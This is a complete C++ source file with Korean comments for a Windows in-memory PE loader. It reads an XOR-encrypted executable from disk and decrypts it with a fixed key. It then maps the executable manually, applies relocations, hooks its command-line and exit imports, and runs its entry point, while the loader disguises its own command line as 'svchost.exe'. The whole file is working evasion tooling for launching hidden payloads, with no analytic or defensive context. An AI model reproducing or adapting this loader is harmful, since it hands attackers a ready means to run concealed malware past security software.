#define _CRT_RAND_S
#include <Windows.h>
#include <stdio.h>
#include <vector>
#include <psapi.h>
#include <winternl.h>
#include <stdlib.h>
 
#pragma comment(lib, "ntdll")
#pragma comment(lib, "psapi")
#pragma warning(disable: 4996)
 
// ====================================================
// 구조체 정의
// ====================================================
struct DATA {
    LPVOID data;
    size_t len;
};
 
// ====================================================
// 커맨드라인 위장용 전역 변수
// ====================================================
BOOL      hijackCmdline = FALSE;
char*     sz_masqCmd_Ansi = NULL;
wchar_t*  sz_masqCmd_Widh = NULL;
wchar_t** poi_masqArgvW = NULL;
char**    poi_masqArgvA = NULL;
int       int_masqCmd_Argc = 0;
 
// ====================================================
// IAT 후킹: GetCommandLine / argv / argc / exit 계열
// ====================================================
LPWSTR   hookGetCommandLineW() { return sz_masqCmd_Widh; }
LPSTR    hookGetCommandLineA() { return sz_masqCmd_Ansi; }
char***    __cdecl hook__p___argv()  { return &poi_masqArgvA; }
wchar_t*** __cdecl hook__p___wargv() { return &poi_masqArgvW; }
int*       __cdecl hook__p___argc()  { return &int_masqCmd_Argc; }
 
int hook__wgetmainargs(int* _Argc, wchar_t*** _Argv, wchar_t*** _Env,
    int _u1, void* _u2)
{
    *_Argc = int_masqCmd_Argc;
    *_Argv = poi_masqArgvW;
    return 0;
}
int hook__getmainargs(int* _Argc, char*** _Argv, char*** _Env,
    int _u1, void* _u2)
{
    *_Argc = int_masqCmd_Argc;
    *_Argv = poi_masqArgvA;
    return 0;
}
 
_onexit_t __cdecl hook_onexit(_onexit_t fn) { return 0; }
int       __cdecl hookatexit(void(__cdecl* fn)(void)) { return 0; }
int       __cdecl hookexit(int) { ExitThread(0); return 0; }
void __stdcall hookExitProcess(UINT) { ExitThread(0); }
 
void MasqueradeCmdline(const char* cmdline)
{
    sz_masqCmd_Ansi = _strdup(cmdline);
 
    int required = MultiByteToWideChar(CP_UTF8, 0, sz_masqCmd_Ansi, -1, NULL, 0);
    sz_masqCmd_Widh = (wchar_t*)calloc((size_t)required + 1, sizeof(wchar_t));
    if (!sz_masqCmd_Widh) return;
    MultiByteToWideChar(CP_UTF8, 0, sz_masqCmd_Ansi, -1, sz_masqCmd_Widh, required);
 
    poi_masqArgvW = CommandLineToArgvW(sz_masqCmd_Widh, &int_masqCmd_Argc);
 
    int memsize = int_masqCmd_Argc * sizeof(LPSTR);
    for (int i = 0; i < int_masqCmd_Argc; i++)
        memsize += WideCharToMultiByte(CP_UTF8, 0, poi_masqArgvW[i], -1, NULL, 0, NULL, NULL);
 
    poi_masqArgvA = (LPSTR*)LocalAlloc(LMEM_FIXED, memsize);
    if (!poi_masqArgvA) return;
 
    int   bufLen = memsize - int_masqCmd_Argc * sizeof(LPSTR);
    LPSTR buf = ((LPSTR)poi_masqArgvA) + int_masqCmd_Argc * sizeof(LPSTR);
    for (int i = 0; i < int_masqCmd_Argc; i++)
    {
        int ret = WideCharToMultiByte(CP_UTF8, 0, poi_masqArgvW[i], -1, buf, bufLen, NULL, NULL);
        poi_masqArgvA[i] = buf;
        buf += ret;
        bufLen -= ret;
    }
    hijackCmdline = TRUE;
}
 
// ====================================================
// PE 헬퍼: NT 헤더 / 데이터 디렉터리
// ====================================================
static char* GetNTHeaders(char* base)
{
    if (!base) return NULL;
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE)         return NULL;
    if (dos->e_lfanew <= 0 || dos->e_lfanew > 1024) return NULL;
    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)(base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE)         return NULL;
    return (char*)nt;
}
 
static IMAGE_DATA_DIRECTORY* GetPEDirectory(PVOID base, size_t id)
{
    if (id >= IMAGE_NUMBEROF_DIRECTORY_ENTRIES) return NULL;
    char* nt = GetNTHeaders((char*)base);
    if (!nt) return NULL;
    IMAGE_DATA_DIRECTORY* dir =
        &((IMAGE_NT_HEADERS*)nt)->OptionalHeader.DataDirectory[id];
    return (dir->VirtualAddress ? dir : NULL);
}
 
// ====================================================
// IAT 복구 (후킹 포함)
// ====================================================
static bool RepairIAT(PVOID modulePtr)
{
    IMAGE_DATA_DIRECTORY* importsDir =
        GetPEDirectory(modulePtr, IMAGE_DIRECTORY_ENTRY_IMPORT);
    if (!importsDir) return false;
 
    size_t maxSize = importsDir->Size;
    size_t impAddr = importsDir->VirtualAddress;
    size_t parsed  = 0;
 
    while (parsed < maxSize)
    {
        IMAGE_IMPORT_DESCRIPTOR* lib =
            (IMAGE_IMPORT_DESCRIPTOR*)((ULONG_PTR)modulePtr + impAddr + parsed);
 
        if (!lib->OriginalFirstThunk && !lib->FirstThunk) break;
 
        LPSTR   libName = (LPSTR)((ULONG_PTR)modulePtr + lib->Name);
        HMODULE hLib    = LoadLibraryA(libName);
 
        size_t callVia   = lib->FirstThunk;
        size_t thunkAddr = lib->OriginalFirstThunk
            ? lib->OriginalFirstThunk : lib->FirstThunk;
        size_t offField = 0, offThunk = 0;
 
        while (true)
        {
            IMAGE_THUNK_DATA* field =
                (IMAGE_THUNK_DATA*)((ULONG_PTR)modulePtr + offField + callVia);
            IMAGE_THUNK_DATA* orig =
                (IMAGE_THUNK_DATA*)((ULONG_PTR)modulePtr + offThunk + thunkAddr);
 
            if (!orig->u1.AddressOfData) break;
 
            if (IMAGE_SNAP_BY_ORDINAL(orig->u1.Ordinal))
            {
                ULONG_PTR ordinal = orig->u1.Ordinal & 0xFFFF;
                field->u1.Function = hLib
                    ? (ULONG_PTR)GetProcAddress(hLib, (LPCSTR)ordinal) : 0;
            }
            else if (field->u1.Function == orig->u1.Function)
            {
                PIMAGE_IMPORT_BY_NAME ibn =
                    (PIMAGE_IMPORT_BY_NAME)((ULONG_PTR)modulePtr
                        + orig->u1.AddressOfData);
                LPSTR funcName = (LPSTR)ibn->Name;
 
                ULONG_PTR addr = hLib
                    ? (ULONG_PTR)GetProcAddress(hLib, funcName) : 0;
 
                if (hijackCmdline)
                {
                    struct { const char* name; ULONG_PTR hook; } hooks[] = {
                        { "GetCommandLineA",  (ULONG_PTR)hookGetCommandLineA  },
                        { "GetCommandLineW",  (ULONG_PTR)hookGetCommandLineW  },
                        { "__wgetmainargs",   (ULONG_PTR)hook__wgetmainargs   },
                        { "__getmainargs",    (ULONG_PTR)hook__getmainargs    },
                        { "__p___argv",       (ULONG_PTR)hook__p___argv       },
                        { "__p___wargv",      (ULONG_PTR)hook__p___wargv      },
                        { "__p___argc",       (ULONG_PTR)hook__p___argc       },
                        { "exit",             (ULONG_PTR)hookexit             },
                        { "_Exit",            (ULONG_PTR)hookexit             },
                        { "_exit",            (ULONG_PTR)hookexit             },
                        { "quick_exit",       (ULONG_PTR)hookexit             },
                        { "ExitProcess",      (ULONG_PTR)hookExitProcess      },
                    };
                    for (auto& h : hooks)
                        if (_stricmp(funcName, h.name) == 0) { addr = h.hook; break; }
                }
                field->u1.Function = addr;
            }
 
            offField += sizeof(IMAGE_THUNK_DATA);
            offThunk += sizeof(IMAGE_THUNK_DATA);
        }
        parsed += sizeof(IMAGE_IMPORT_DESCRIPTOR);
    }
    return true;
}
 
// ====================================================
// Base Relocation 처리
// ====================================================
static void ApplyRelocations(BYTE* imageBase, IMAGE_NT_HEADERS* nt, ULONG_PTR delta)
{
    IMAGE_DATA_DIRECTORY* relocDirEntry =
        &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    if (!relocDirEntry->VirtualAddress || !delta) return;
 
    PIMAGE_BASE_RELOCATION reloc =
        (PIMAGE_BASE_RELOCATION)(imageBase + relocDirEntry->VirtualAddress);
    BYTE* relocEnd = (BYTE*)reloc + relocDirEntry->Size;
 
    while ((BYTE*)reloc < relocEnd
        && reloc->SizeOfBlock >= sizeof(IMAGE_BASE_RELOCATION))
    {
        DWORD count = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION))
            / sizeof(WORD);
        WORD* entries = (WORD*)((BYTE*)reloc + sizeof(IMAGE_BASE_RELOCATION));
 
        for (DWORD i = 0; i < count; i++)
        {
            WORD type   = entries[i] >> 12;
            WORD offset = entries[i] & 0x0FFF;
            if (type == IMAGE_REL_BASED_ABSOLUTE) continue;
 
            ULONG_PTR* patchAddr =
                (ULONG_PTR*)(imageBase + reloc->VirtualAddress + offset);
#ifdef _WIN64
            if (type == IMAGE_REL_BASED_DIR64)   *patchAddr += delta;
#else
            if (type == IMAGE_REL_BASED_HIGHLOW)  *patchAddr += delta;
#endif
        }
        reloc = (PIMAGE_BASE_RELOCATION)((BYTE*)reloc + reloc->SizeOfBlock);
    }
}
 
// ====================================================
// XOR 복호화
// ====================================================
static void XorData(DATA* input, BYTE key)
{
    if (!input || !input->data || !input->len) return;
    BYTE* buf = (BYTE*)input->data;
    for (size_t i = 0; i < input->len; i++) buf[i] ^= key;
}
 
// ====================================================
// 파일에서 PE 로드
// ====================================================
static DATA LoadFromFile(const char* path)
{
    DATA result = { NULL, 0 };
    FILE* fp = fopen(path, "rb");
    if (!fp) { printf("[-] 파일 열기 실패: %s\n", path); return result; }
 
    fseek(fp, 0, SEEK_END);
    long sz = ftell(fp);
    if (sz <= 0) { fclose(fp); return result; }
    fseek(fp, 0, SEEK_SET);
 
    result.data = malloc((size_t)sz);
    if (!result.data) { fclose(fp); return result; }
 
    size_t rd = fread(result.data, 1, (size_t)sz, fp);
    fclose(fp);
    if (rd != (size_t)sz)
    {
        free(result.data); result.data = NULL; return result;
    }
    result.len = (size_t)sz;
    XorData(&result, 0x55);
    return result;
}
 
// ====================================================
// 섹션 특성 → 페이지 보호 변환
// ====================================================
static DWORD SectionCharToProtect(DWORD ch)
{
    bool exec  = (ch & IMAGE_SCN_MEM_EXECUTE) != 0;
    bool write = (ch & IMAGE_SCN_MEM_WRITE)   != 0;
    bool read  = (ch & IMAGE_SCN_MEM_READ)    != 0;
 
    if (exec && write) return PAGE_EXECUTE_READWRITE;
    if (exec && read)  return PAGE_EXECUTE_READ;
    if (exec)          return PAGE_EXECUTE;
    if (write && read) return PAGE_READWRITE;
    if (read)          return PAGE_READONLY;
    return PAGE_NOACCESS;
}
 
// ====================================================
// PE 로더
// ====================================================
static void PELoader(char* data, DWORD datasize)
{
    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)GetNTHeaders(data);
    if (!nt) { printf("[-] NT 헤더 파싱 실패\n"); return; }
 
    DWORD sizeOfImage   = nt->OptionalHeader.SizeOfImage;
    DWORD sizeOfHeaders = nt->OptionalHeader.SizeOfHeaders;
    if (!sizeOfImage) { printf("[-] SizeOfImage == 0\n"); return; }
 
    LPVOID preferAddr = (LPVOID)nt->OptionalHeader.ImageBase;
 
    // 선호 주소에 기존 매핑 제거
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (hNtdll)
    {
        auto pNtUnmap = (int(WINAPI*)(HANDLE, PVOID))
            GetProcAddress(hNtdll, "NtUnmapViewOfSection");
        if (pNtUnmap) pNtUnmap((HANDLE)-1, preferAddr);
    }
 
    // VirtualAlloc으로 메모리 확보
    BYTE* imageBase = (BYTE*)VirtualAlloc(preferAddr, sizeOfImage,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!imageBase)
    {
        IMAGE_DATA_DIRECTORY* relocDir =
            &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        if (!relocDir->VirtualAddress)
        {
            printf("[-] 선호 주소 할당 실패, Relocation 없음 → 중단\n");
            return;
        }
        imageBase = (BYTE*)VirtualAlloc(NULL, sizeOfImage,
            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!imageBase) { printf("[-] VirtualAlloc 실패\n"); return; }
        printf("[!] 임의 주소에 할당: %p\n", imageBase);
    }
 
    // 헤더 복사
    memcpy(imageBase, data, sizeOfHeaders);
 
    // 섹션 복사
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++)
    {
        if (!sec[i].SizeOfRawData) continue;
 
        DWORD vSize   = sec[i].Misc.VirtualSize;
        DWORD rawSize = sec[i].SizeOfRawData;
        DWORD copy    = (vSize > 0) ? min(rawSize, vSize) : rawSize;
 
        if ((DWORD64)sec[i].PointerToRawData + copy > datasize ||
            (DWORD64)sec[i].VirtualAddress   + copy > sizeOfImage)
        {
            printf("[-] 섹션 %d 경계 초과, 건너뜀\n", i);
            continue;
        }
        memcpy(imageBase + sec[i].VirtualAddress,
               data + sec[i].PointerToRawData, copy);
    }
 
    // Base Relocation
    ULONG_PTR delta = (ULONG_PTR)imageBase - nt->OptionalHeader.ImageBase;
    if (delta)
    {
        printf("[*] Relocation delta: 0x%llX\n", (unsigned long long)delta);
        ApplyRelocations(imageBase, nt, delta);
        nt->OptionalHeader.ImageBase = (ULONG_PTR)imageBase;
    }
 
    // IAT 복구
    if (!RepairIAT(imageBase))
    {
        printf("[-] IAT 복구 실패\n");
        VirtualFree(imageBase, 0, MEM_RELEASE);
        return;
    }
 
    // 섹션별 권한 설정
    printf("[*] 섹션별 권한 적용 중...\n");
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++)
    {
        if (!sec[i].Misc.VirtualSize) continue;
 
        DWORD  prot    = SectionCharToProtect(sec[i].Characteristics);
        DWORD  oldProt = 0;
        LPVOID secBase = imageBase + sec[i].VirtualAddress;
        SIZE_T secSize = sec[i].Misc.VirtualSize;
 
        if (!VirtualProtect(secBase, secSize, prot, &oldProt))
            printf("[!] 섹션 %d VirtualProtect 실패 (%lu)\n", i, GetLastError());
        else
            printf("[+] 섹션 %-8.8s → 보호: 0x%02X\n", (char*)sec[i].Name, prot);
    }
 
    // Entry Point 실행
    DWORD epRva = nt->OptionalHeader.AddressOfEntryPoint;
    if (epRva >= sizeOfImage)
    {
        printf("[-] 잘못된 Entry Point RVA: 0x%X\n", epRva);
        VirtualFree(imageBase, 0, MEM_RELEASE);
        return;
    }
 
    void* ep = imageBase + epRva;
    printf("[+] Entry Point: %p\n", ep);
 
    typedef void(*pEP)();
    ((pEP)ep)();
 
    VirtualFree(imageBase, 0, MEM_RELEASE);
}
 
// ====================================================
// main
// ====================================================
int main(int argc, char** argv)
{
    if (argc < 3)
    {
        printf("[+] 사용법: %s file <PE 파일 경로>\n", argv[0]);
        return 1;
    }
 
    if (_stricmp(argv[1], "file") != 0)
    {
        printf("[-] 알 수 없는 모드: %s\n", argv[1]);
        return 1;
    }
 
    MasqueradeCmdline("svchost.exe");
 
    printf("[*] 파일에서 로드: %s\n", argv[2]);
    DATA pe = LoadFromFile(argv[2]);
 
    if (!pe.data || pe.len == 0)
    {
        printf("[-] PE 데이터 획득 실패\n");
        return 1;
    }
 
    printf("[+] PE 크기: %zu 바이트\n", pe.len);
    printf("[+] PE 로딩 시작...\n");
    PELoader((char*)pe.data, (DWORD)pe.len);
 
    free(pe.data);
    printf("[+] 완료\n");
    return 0;
}
